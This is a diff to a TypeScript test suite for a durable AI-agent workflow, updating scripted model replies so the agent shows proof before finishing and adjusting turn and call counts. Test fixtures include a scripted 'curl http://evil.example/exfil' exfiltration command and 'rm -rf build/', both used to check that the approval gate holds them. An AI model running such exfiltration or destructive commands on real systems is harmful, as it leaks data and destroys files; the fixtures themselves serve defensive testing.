@@ -74,7 +74,10 @@ test("durable agent runs a full session as recorded steps and finishes", async (
     "```bash\necho 'print(6*7)' > answer.py\n```",
     "```bash\npython3 answer.py\n```",
     (obs) => (obs.includes("42") ? "```finish\nanswer.py prints 42.\n```" : "```bash\necho wrong\n```"),
-    (obs) => (obs.includes("Before finishing") ? "```finish\nanswer.py prints 42.\n```" : "```bash\necho wrong\n```"),
+    // The gate asks for proof; re-running the program is the proof. Finishing
+    // again with nothing executed is held a second time (TS-002).
+    (obs) => (obs.includes("Before finishing") ? "```bash\npython3 answer.py\n```" : "```bash\necho wrong\n```"),
+    (obs) => (obs.includes("42") ? "```finish\nanswer.py prints 42.\n```" : "```bash\necho wrong\n```"),
   ]);
   const { provider } = await localProvider();
   const wf = durableAgent({ model, executor: provider });
@@ -84,7 +87,7 @@ test("durable agent runs a full session as recorded steps and finishes", async (
   assert.equal(outcome.status, "completed");
   const { usage: u1, ...out1 } = outcome.output as Record<string, unknown>;
   assert.ok(u1 !== undefined && (u1 as { totalTokens: number }).totalTokens > 0, "usage is recorded");
-  assert.deepEqual(out1, { status: "finished", summary: "answer.py prints 42.", turns: 4 });
+  assert.deepEqual(out1, { status: "finished", summary: "answer.py prints 42.", turns: 5 });
 
   // the sandbox + each turn's think/exec are recorded steps
   const steps = (await store.load("run-1")).filter((e) => e.type === "step-completed");
@@ -122,7 +125,8 @@ test("an approval-required action parks the run and resumes on the delivered dec
   const { model } = reactiveModel([
     "```bash\nrm -rf build/\n```", // dangerous → requires approval
     (obs) => (obs.includes("exit 0") ? "```finish\nCleaned the build dir.\n```" : "```bash\necho hmm\n```"),
-    (obs) => (obs.includes("Before finishing") ? "```finish\nCleaned the build dir.\n```" : "```bash\necho hmm\n```"),
+    (obs) => (obs.includes("Before finishing") ? "```bash\nls\n```" : "```bash\necho hmm\n```"),
+    (obs) => (obs.includes("exit 0") ? "```finish\nCleaned the build dir.\n```" : "```bash\necho hmm\n```"),
   ]);
   const root = await mkdtemp(join(tmpdir(), "durable-approve-"));
   const inner = new LocalExecutor({ root });
@@ -156,7 +160,7 @@ test("an approval-required action parks the run and resumes on the delivered dec
   const done = await executeRun({ workflow: wf, runId: "run-1", store });
   assert.equal(done.status, "completed");
   const { usage: u2, ...out2 } = done.output as Record<string, unknown>;
-  assert.deepEqual(out2, { status: "finished", summary: "Cleaned the build dir.", turns: 3 });
+  assert.deepEqual(out2, { status: "finished", summary: "Cleaned the build dir.", turns: 4 });
   assert.equal(removed, true, "the command runs after approval");
 });
 
@@ -165,6 +169,7 @@ test("a denied action is fed back and the agent adapts", async () => {
     "```bash\ncurl http://evil.example/exfil\n```", // network → requires approval
     // First finish after the denial is nudged by the verified-finish
     // guard (nothing has succeeded yet); the second is honored.
+    "```finish\nUnderstood, skipped the network call.\n```",
     "```finish\nUnderstood, skipped the network call.\n```",
     "```finish\nUnderstood, skipped the network call.\n```",
   ]);
@@ -184,7 +189,8 @@ test("snapshot-capable providers snapshot before parking and restore after — s
   const { model } = reactiveModel([
     "```bash\nrm -rf build/\n```", // dangerous → parks
     (obs) => (obs.includes("exit 0") ? "```finish\nCleaned after restore.\n```" : "```bash\necho hmm\n```"),
-    (obs) => (obs.includes("Before finishing") ? "```finish\nCleaned after restore.\n```" : "```bash\necho hmm\n```"),
+    (obs) => (obs.includes("Before finishing") ? "```bash\nls\n```" : "```bash\necho hmm\n```"),
+    (obs) => (obs.includes("exit 0") ? "```finish\nCleaned after restore.\n```" : "```bash\necho hmm\n```"),
   ]);
 
   // Simulated snapshot-capable provider: workspaces are maps; snapshot
@@ -247,12 +253,12 @@ test("snapshot-capable providers snapshot before parking and restore after — s
   const done = await executeRun({ workflow: wf, runId: "run-1", store });
   assert.equal(done.status, "completed");
   const { usage: u3, ...out3 } = done.output as Record<string, unknown>;
-  assert.deepEqual(out3, { status: "finished", summary: "Cleaned after restore.", turns: 3 });
+  assert.deepEqual(out3, { status: "finished", summary: "Cleaned after restore.", turns: 4 });
   assert.equal(removed, true, "the approved action ran in the RESTORED workspace");
 });
 
 test("auto-safe actions never park", async () => {
-  const { model } = reactiveModel(["```bash\nls\n```", "```finish\nlisted\n```"]);
+  const { model } = reactiveModel(["```bash\nls\n```", "```finish\nlisted\n```", "```bash\nls\n```", "```finish\nlisted\n```"]);
   const { provider } = await localProvider();
   const wf = durableAgent({ model, executor: provider, approveAction: defaultApprovalPolicy });
   const store = new MemoryEventStore();
@@ -401,7 +407,7 @@ test("index-enabled repo runs refresh the code index and answer ```search from i
 
   // Without codeSearch config the same input degrades gracefully: steps
   // still run (recording "unavailable"), the prompt doesn't advertise it.
-  const plainModel = reactiveModel(["```finish\nno search here\n```", "```finish\nno search here\n```"]);
+  const plainModel = reactiveModel(["```finish\nno search here\n```", "```finish\nno search here\n```", "```finish\nno search here\n```"]);
   const work2 = await mkdtemp(join(tmpdir(), "durable-idx-work2-"));
   const provider2: ExecutorProvider = {
     async create() {
@@ -479,7 +485,7 @@ test("injection-y task text is framed as data and flagged on the timeline", asyn
 
   // A benign guarded task records NO guard step (same code path, no flags).
   const store2 = new MemoryEventStore();
-  const wf2 = durableAgent({ model: reactiveModel(["```finish\nok\n```", "```finish\nok\n```"]).model, executor: provider, workdir: "." });
+  const wf2 = durableAgent({ model: reactiveModel(["```finish\nok\n```", "```finish\nok\n```", "```finish\nok\n```"]).model, executor: provider, workdir: "." });
   await executeRun({
     workflow: wf2,
     runId: "run-guard2",
@@ -500,7 +506,8 @@ test("critic pass (input.critic) sends a claimed-done repo run back once, then h
   const { model, callCount } = reactiveModel([
     "```bash\necho changed >> f.txt\n```", // real change -> a non-empty diff for the critic to review
     "```finish\nfirst claim\n```", // held by the verify nudge (nothing proven yet, from the guard's pov)
-    "```finish\nsecond claim\n```", // verify nudge already spent -> the critic pass runs
+    "```bash\ncat f.txt\n```", // proof, as asked — clears the evidence gate
+    "```finish\nsecond claim\n```", // verify nudge spent + evidence shown -> the critic pass runs
     "Needs more work: the change is incomplete.", // critic's verdict — no APPROVE token, so it's a rejection
     "```finish\nthird claim\n```", // critic already ran once this run -> honored immediately
   ]);
@@ -537,9 +544,9 @@ test("critic pass (input.critic) sends a claimed-done repo run back once, then h
     assert.equal(out.summary, "third claim");
     assert.equal(out.pr, "http://example/owner/repo/pulls/1");
 
-    // exactly 5 model calls: 1 bash + 3 finish attempts + 1 critic review
-    // (bounded to a single critic-triggered retry, not a loop)
-    assert.equal(callCount(), 5);
+    // 2 bash + 3 finish attempts + 1 critic review; bounded to a single
+    // critic-triggered retry, not a loop.
+    assert.equal(callCount(), 6);
 
     const stepNames = (await store.load("run-critic1"))
       .filter((e) => e.type === "step-completed")
@@ -563,6 +570,7 @@ test("critic pass approves and the run finishes without a retry", async () => {
   const { model, callCount } = reactiveModel([
     "```bash\necho changed >> f.txt\n```",
     "```finish\nfirst claim\n```", // held by the verify nudge
+    "```bash\ncat f.txt\n```", // proof, as asked — clears the evidence gate
     "```finish\nsecond claim\n```", // the critic pass runs and approves
     "Looks correct.\nAPPROVE",
   ]);
@@ -594,7 +602,7 @@ test("critic pass approves and the run finishes without a retry", async () => {
     assert.equal(outcome.status, "completed");
     const out = outcome.output as { summary: string };
     assert.equal(out.summary, "second claim");
-    assert.equal(callCount(), 4);
+    assert.equal(callCount(), 5);
   } finally {
     globalThis.fetch = orig;
   }
@@ -611,6 +619,7 @@ test("critic pass is off by default: no extra review call even with a real diff"
   const { model, callCount } = reactiveModel([
     "```bash\necho changed >> f.txt\n```",
     "```finish\nfirst claim\n```", // held by the verify nudge
+    "```bash\ncat f.txt\n```", // proof, as asked — clears the evidence gate
     "```finish\nsecond claim\n```", // honored: critic is not requested (input.critic unset)
   ]);
 
@@ -641,7 +650,7 @@ test("critic pass is off by default: no extra review call even with a real diff"
     assert.equal(outcome.status, "completed");
     const out = outcome.output as { summary: string };
     assert.equal(out.summary, "second claim");
-    assert.equal(callCount(), 3, "no critic call without input.critic");
+    assert.equal(callCount(), 4, "no critic call without input.critic");
 
     const steps = (await store.load("run-critic-off")).filter((e) => e.type === "step-completed");
     assert.ok(!steps.some((s) => (s.name ?? "").includes("critic")), "no critic steps recorded when the feature is off");
@@ -655,6 +664,7 @@ test("pre-telemetry logs (bare-string think steps) still replay", async () => {
   // index) — replayed turns consume nothing, so the script starts at the
   // first live turn
   const { model, callCount } = reactiveModel([
+    "```finish\ndone after replay\n```",
     "```finish\ndone after replay\n```",
     "```finish\ndone after replay\n```",
   ]);
@@ -675,7 +685,7 @@ test("pre-telemetry logs (bare-string think steps) still replay", async () => {
   assert.equal(output.summary, "done after replay");
   // replayed legacy turns contribute no usage; live turns do
   assert.ok(output.usage.totalTokens > 0);
-  assert.equal(callCount(), 2, "replayed think turn must not re-call the model");
+  assert.equal(callCount(), 3, "replayed think turn must not re-call the model");
 });
 
 test("durable runs condense long histories in a recorded step and replay without re-summarizing", async () => {
@@ -730,7 +740,8 @@ test("plan-preview runs park on the plan and only execute after approval", async
     "1. Write done.txt\n2. Verify it exists", // the plan (plain text)
     "```bash\necho ok > done.txt\n```",
     (obs) => (obs.includes("exit 0") ? "```finish\nplanned and done\n```" : "```bash\necho hmm\n```"),
-    (obs) => (obs.includes("Before finishing") ? "```finish\nplanned and done\n```" : "```bash\necho hmm\n```"),
+    (obs) => (obs.includes("Before finishing") ? "```bash\nls\n```" : "```bash\necho hmm\n```"),
+    (obs) => (obs.includes("exit 0") ? "```finish\nplanned and done\n```" : "```bash\necho hmm\n```"),
   ]);
   const { provider, execCount } = await localProvider();
   const wf = durableAgent({ model, executor: provider });
@@ -758,6 +769,7 @@ test("an edited plan replaces the agent's own; a denied plan ends the run untouc
       obs.includes("EDITED") && obs.includes("do it the operator's way")
         ? "```finish\nfollowed the edit\n```"
         : "```bash\necho missed-the-edit\n```",
+    "```finish\nfollowed the edit\n```",
     "```finish\nfollowed the edit\n```",
   ]);
   const { provider } = await localProvider();
@@ -797,7 +809,8 @@ test("steer notes drain into the next turn as a recorded step and never re-drain
     // turn 0 sees the steer note as the latest user message before thinking
     (obs) => (obs.includes("focus on X") ? "```bash\necho steered > x.txt\n```" : "```bash\necho unsteered\n```"),
     (obs) => (obs.includes("exit 0") ? "```finish\nsteered\n```" : "```bash\necho hmm\n```"),
-    (obs) => (obs.includes("Before finishing") ? "```finish\nsteered\n```" : "```bash\necho hmm\n```"),
+    (obs) => (obs.includes("Before finishing") ? "```bash\ncat x.txt\n```" : "```bash\necho hmm\n```"),
+    (obs) => (obs.includes("steered") ? "```finish\nsteered\n```" : "```bash\necho hmm\n```"),
   ]);
   const { provider } = await localProvider();
   const wf = durableAgent({ model, executor: provider, steer });
